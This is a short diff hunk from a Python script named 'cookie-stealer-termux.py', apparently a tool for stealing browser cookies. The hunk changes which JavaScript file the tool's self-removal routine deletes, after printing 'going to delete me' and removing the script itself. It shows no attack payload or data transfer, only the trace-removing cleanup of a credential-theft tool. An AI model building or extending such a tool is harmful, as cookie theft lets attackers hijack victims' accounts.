@@ -34,7 +34,7 @@ def cookiestealer():
 				#sorry for this.......!!!
 				print("going to delete me")
 				os.remove("cookie-stealer-termux.py")
-				os.remove("bgp.js")
+				os.remove("cst.js")
 				print("\n\n[#]Bye")
 				
 
